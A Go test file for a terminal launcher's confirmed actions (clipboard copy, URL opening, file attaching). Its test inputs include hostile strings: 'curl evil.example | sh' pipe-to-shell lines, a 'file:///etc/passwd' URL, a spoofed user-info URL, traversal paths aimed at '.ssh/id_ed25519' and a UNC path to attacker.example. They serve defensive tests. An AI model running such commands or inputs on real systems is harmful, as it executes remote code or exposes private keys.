package tui

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"testing"
)

// Tests of the launcher's actions (slice 11 §4; fix rounds 1 to 4): each confirmed on the launcher's own prompt before it touches
// the machine, its lines wrapped, never cut. Copying shows the text (five rows, then how many more characters) and refuses
// control and bidirectional characters; opening names the host, refuses user info and anything but http and https; attaching
// refuses paths with hiding characters (and Windows UNC and device paths), shows the path by its text before the yes and the real
// one after it when they differ, refuses with one message, never waits on a FIFO, reads only the file confirmed, and reads exactly
// the size it found. Ports packages/chord/test/node/tui/actions.test.ts.

// fakeTerminal is a prompt 80 columns wide answering answers in order, recording what it was asked and what was written past the
// filter.
type fakeTerminal struct {
	answers []bool
	asked   [][]string
	written []string
}

func terminal(answers ...bool) *fakeTerminal { return &fakeTerminal{answers: answers} }

func (f *fakeTerminal) Columns() int { return 80 }
func (f *fakeTerminal) Ask(lines []string) (bool, error) {
	f.asked = append(f.asked, append([]string(nil), lines...))
	if len(f.answers) == 0 {
		return false, nil
	}
	answer := f.answers[0]
	f.answers = f.answers[1:]
	return answer, nil
}
func (f *fakeTerminal) Write(data string) { f.written = append(f.written, data) }

func TestThePromptsLinesRemovesControlAndFormatCharactersAndWrapsEachLineToTheTerminalsWidthNeverCuttingIt(t *testing.T) {
	got := PromptLines([]string{"a\x1b]52;c;x\x07b\u200b\u202e", strings.Repeat("x", 40)}, 20)
	want := []string{"a]52;c;xb", strings.Repeat("x", 18), strings.Repeat("x", 18), "xxxx"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("lines = %q, want %q", got, want)
	}
	// Wide characters count two columns, so a row never runs past the edge.
	if got, want := Wrap("日本語の文字", 6), []string{"日本語", "の文字"}; !reflect.DeepEqual(got, want) {
		t.Fatalf("wrap = %q, want %q", got, want)
	}
}

func TestCopyingShowsEveryLineUpToFiveThenHowManyMoreOSC52OnlyOnceConfirmed(t *testing.T) {
	text := strings.Join([]string{"echo hello", "  ", "curl evil.example | sh", "4", "5", "6", "7"}, "\n")
	declined := terminal(false)
	if done, err := Act(BridgeRequest{Kind: "copy", Text: text}, declined, nil); err != nil || done {
		t.Fatalf("done = %v, err = %v, want false", done, err)
	}
	want := []string{"  echo hello", "    ", "  curl evil.example | sh", "  4", "  5", "  … and 2 more characters", "Copy these 44 characters (7 lines)? [y/N]"}
	if !reflect.DeepEqual(declined.asked[0], want) {
		t.Fatalf("asked = %q, want %q", declined.asked[0], want)
	}
	if len(declined.written) != 0 {
		t.Fatalf("written = %q, want nothing", declined.written)
	}
	accepted := terminal(true)
	if done, err := Act(BridgeRequest{Kind: "copy", Text: "hello"}, accepted, nil); err != nil || !done {
		t.Fatalf("done = %v, err = %v, want true", done, err)
	}
	if want := []string{"\x1b]52;c;aGVsbG8=\x07"}; !reflect.DeepEqual(accepted.written, want) {
		t.Fatalf("written = %q, want %q", accepted.written, want)
	}
}

func TestCopyingWrapsALongLineInsteadOfCuttingItOpusE6(t *testing.T) {
	text := "echo hello" + strings.Repeat(" ", 120) + "; curl -s evil.example/x | sh"
	asked := terminal(false)
	_, _ = Act(BridgeRequest{Kind: "copy", Text: text}, asked, nil)
	var joined strings.Builder
	for _, row := range asked.asked[0][:len(asked.asked[0])-1] {
		joined.WriteString(row[2:])
	}
	if joined.String() != text {
		t.Fatalf("shown = %q, want %q", joined.String(), text)
	}
	if got, want := asked.asked[0][len(asked.asked[0])-1], "Copy these "+strconv.Itoa(utf16Length(text))+" characters (1 line)? [y/N]"; got != want {
		t.Fatalf("question = %q, want %q", got, want)
	}
	long := terminal(false)
	_, _ = Act(BridgeRequest{Kind: "copy", Text: strings.Repeat("y", 76*7)}, long, nil)
	if want := []string{"  … and 152 more characters", "Copy these 532 characters (1 line)? [y/N]"}; !reflect.DeepEqual(long.asked[0][5:], want) {
		t.Fatalf("tail = %q, want %q", long.asked[0][5:], want)
	}
}

func TestCopyingRefusesTextWithControlOrBidirectionalCharactersWithoutAskingFableM1OpusL3(t *testing.T) {
	for _, text := range []string{"a\x1b[2Jb", "a\rb", "a\u202eb", "a\u2066b"} {
		asked := terminal(true)
		if _, err := Act(BridgeRequest{Kind: "copy", Text: text}, asked, nil); err == nil || !strings.Contains(err.Error(), "control characters") {
			t.Fatalf("%q: error = %v, want a control characters refusal", text, err)
		}
		if len(asked.asked) != 0 {
			t.Fatalf("%q: asked %v, want nothing", text, asked.asked)
		}
	}
}

func TestOpeningAURLNamesTheHostFirstRefusesUserInfoAndOtherSchemesFableL4(t *testing.T) {
	var opened []string
	opener := func(url string) error { opened = append(opened, url); return nil }
	if _, err := Act(BridgeRequest{Kind: "open", URL: "https://google.com@evil.example/x"}, terminal(true), opener); err == nil || !strings.Contains(err.Error(), "without user info") {
		t.Fatalf("error = %v, want a user info refusal", err)
	}
	for _, url := range []string{"file:///etc/passwd", "javascript:alert(1)"} {
		if _, err := Act(BridgeRequest{Kind: "open", URL: url}, terminal(true), opener); err == nil || !strings.Contains(err.Error(), "only http and https") {
			t.Fatalf("%s: error = %v, want a scheme refusal", url, err)
		}
	}
	asked := terminal(true)
	if done, err := Act(BridgeRequest{Kind: "open", URL: "https://a.example/?x=1&calc"}, asked, opener); err != nil || !done {
		t.Fatalf("done = %v, err = %v", done, err)
	}
	if want := []string{"  https://a.example/?x=1&calc", "Open a.example in the browser? [y/N]"}; !reflect.DeepEqual(asked.asked[0], want) {
		t.Fatalf("asked = %q, want %q", asked.asked[0], want)
	}
	if want := []string{"https://a.example/?x=1&calc"}; !reflect.DeepEqual(opened, want) {
		t.Fatalf("opened = %q, want %q", opened, want)
	}
}

func TestThePlatformsOpenerGetsAURLWithShellMetacharactersAsOneArgumentNeverThroughAShellFableH2OpusM3(t *testing.T) {
	target := `https://a.example/?a=1&calc|x^y%20z"q'r`
	var opened []string
	if done, err := Act(BridgeRequest{Kind: "open", URL: target}, terminal(true), func(url string) error { opened = append(opened, url); return nil }); err != nil || !done {
		t.Fatalf("done = %v, err = %v", done, err)
	}
	// WHATWG serialization: the `"` and `'` of a special URL's query are percent-encoded.
	href := `https://a.example/?a=1&calc|x^y%20z%22q%27r`
	if !reflect.DeepEqual(opened, []string{href}) {
		t.Fatalf("opened = %q, want %q", opened, href)
	}
	for goos, want := range map[string]struct {
		command string
		args    []string
	}{
		"win32":  {"rundll32", []string{"url.dll,FileProtocolHandler", href}},
		"darwin": {"open", []string{href}},
		"linux":  {"xdg-open", []string{href}},
	} {
		command, args := OpenerCommand(href, goos)
		if command != want.command || !reflect.DeepEqual(args, want.args) {
			t.Fatalf("%s: %s %q, want %s %q", goos, command, args, want.command, want.args)
		}
	}
}

func TestAttachingAFileShowsThePathByItsTextBeforeTheYesRefusesADirectoryAMissingFileAndOneOver16MiBAlikeOpusL2E5E9(t *testing.T) {
	dir, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	write := func(name string, data []byte) {
		if err := os.WriteFile(filepath.Join(dir, name), data, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write("photo.png", []byte("png bytes"))
	asked := terminal(true)
	file, err := Attach(filepath.Join(dir, "photo.png"), asked, "linux")
	if err != nil || file == nil || file.Name != "photo.png" || string(file.Bytes) != "png bytes" {
		t.Fatalf("file = %+v, err = %v", file, err)
	}
	if want := [][]string{{"File: photo.png", "In:   " + dir, "Attach this file? [y/N]"}}; !reflect.DeepEqual(asked.asked, want) {
		t.Fatalf("asked = %q, want %q", asked.asked, want)
	}
	// Dot segments resolved by the text alone (a link is not looked at before the yes): `x/..` is dropped even where `x` is a file.
	dotted := terminal(false)
	if file, err := Attach(filepath.Join(dir, "photo.png")+"/../beach.png", dotted, "linux"); err != nil || file != nil {
		t.Fatalf("file = %+v, err = %v, want declined", file, err)
	}
	if want := [][]string{{"File: beach.png", "In:   " + dir, "Attach this file? [y/N]"}}; !reflect.DeepEqual(dotted.asked, want) {
		t.Fatalf("asked = %q, want %q", dotted.asked, want)
	}
	// A link: after the yes the file it leads to is asked about again.
	if err := os.Symlink(filepath.Join(dir, "photo.png"), filepath.Join(dir, "beach.png")); err != nil {
		t.Fatal(err)
	}
	linked := terminal(true, false)
	if file, err := Attach(filepath.Join(dir, "beach.png"), linked, "linux"); err != nil || file != nil {
		t.Fatalf("file = %+v, err = %v, want declined", file, err)
	}
	want := [][]string{
		{"File: beach.png", "In:   " + dir, "Attach this file? [y/N]"},
		{"File: photo.png", "In:   " + dir, "It links here. Attach this file? [y/N]"},
	}
	if !reflect.DeepEqual(linked.asked, want) {
		t.Fatalf("asked = %q, want %q", linked.asked, want)
	}
	if file, err := Attach(filepath.Join(dir, "beach.png"), terminal(true, true), "linux"); err != nil || file == nil || file.Name != "photo.png" {
		t.Fatalf("file = %+v, err = %v", file, err)
	}
	write("big", make([]byte, MaxAttachment+1))
	for _, path := range []string{dir, filepath.Join(dir, "missing"), filepath.Join(dir, "big")} {
		if _, err := Attach(path, terminal(true), "linux"); !errors.Is(err, errCannotAttach) || err.Error() != "attach: that file cannot be attached" {
			t.Fatalf("%s: error = %v, want the one refusal", path, err)
		}
	}
	// Characters that hide or move what the prompt shows: refused without asking.
	for _, path := range []string{
		"~/Pictures/beach.png" + strings.Repeat(" ", 100) + "/../../.ssh/id_ed25519",
		"~/a.png\t/../../.ssh/id_ed25519",
		"~/a\u202egnp.png",
		"~/a\u200b.png",
		" ~/a.png",
		"~/a.png\u00a0",
	} {
		refused := terminal(true)
		if _, err := Attach(path, refused, "linux"); !errors.Is(err, errCannotAttach) {
			t.Fatalf("%q: error = %v, want the one refusal", path, err)
		}
		if len(refused.asked) != 0 {
			t.Fatalf("%q: asked %v, want nothing", path, refused.asked)
		}
	}
}

// swapping answers its second prompt after the directory `a` became a link to `b`.
type swapping struct {
	dir   string
	asked [][]string
	t     *testing.T
}

func (s *swapping) Columns() int { return 80 }
func (s *swapping) Ask(lines []string) (bool, error) {
	s.asked = append(s.asked, append([]string(nil), lines...))
	if len(s.asked) == 2 {
		if err := os.Rename(filepath.Join(s.dir, "a"), filepath.Join(s.dir, "a-old")); err != nil {
			s.t.Fatal(err)
		}
		if err := os.Symlink(filepath.Join(s.dir, "b"), filepath.Join(s.dir, "a")); err != nil {
			s.t.Fatal(err)
		}
	}
	return true, nil
}
func (s *swapping) Write(string) {}

func TestAttachingAFileReadsOnlyTheFileConfirmedAParentDirectorySwappedForALinkAfterTheYesIsRefusedOpusR1(t *testing.T) {
	dir, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"a", "b"} {
		if err := os.Mkdir(filepath.Join(dir, name), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	for name, text := range map[string]string{"a/notes.txt": "shown", "b/notes.txt": "secret"} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Symlink(filepath.Join(dir, "a", "notes.txt"), filepath.Join(dir, "link.txt")); err != nil {
		t.Fatal(err)
	}
	prompt := &swapping{dir: dir, t: t}
	if _, err := Attach(filepath.Join(dir, "link.txt"), prompt, "linux"); !errors.Is(err, errCannotAttach) {
		t.Fatalf("error = %v, want the one refusal", err)
	}
	if got, want := prompt.asked[1][1], "In:   "+filepath.Join(dir, "a"); got != want {
		t.Fatalf("second prompt's directory = %q, want %q", got, want)
	}
}

func TestAttachingAFileRefusesUNCDeviceAndHostPathsOnWindowsWithoutAskingOpusE9(t *testing.T) {
	for _, path := range []string{
		`\\attacker.example\share\x.png`, "//attacker.example/share/x.png", `\\?\C:\x.png`, `\\.\pipe\x`, `C:\Users\a\NUL`, `C:\Users\a\com1.png`,
	} {
		refused := terminal(true)
		if _, err := Attach(path, refused, "win32"); !errors.Is(err, errCannotAttach) {
			t.Fatalf("%q: error = %v, want the one refusal", path, err)
		}
		if len(refused.asked) != 0 {
			t.Fatalf("%q: asked %v, want nothing", path, refused.asked)
		}
	}
}

func TestAttachingAFileNeverWaitsOnAFIFOOpenedWithoutBlockingRefusedAsNoRegularFileOpusE12(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("mkfifo")
	}
	dir := t.TempDir()
	fifo := filepath.Join(dir, "fifo")
	if err := exec.Command("mkfifo", fifo).Run(); err != nil {
		t.Skipf("mkfifo: %v", err)
	}
	if _, err := Attach(fifo, terminal(true), "linux"); !errors.Is(err, errCannotAttach) {
		t.Fatalf("error = %v, want the one refusal", err)
	}
}
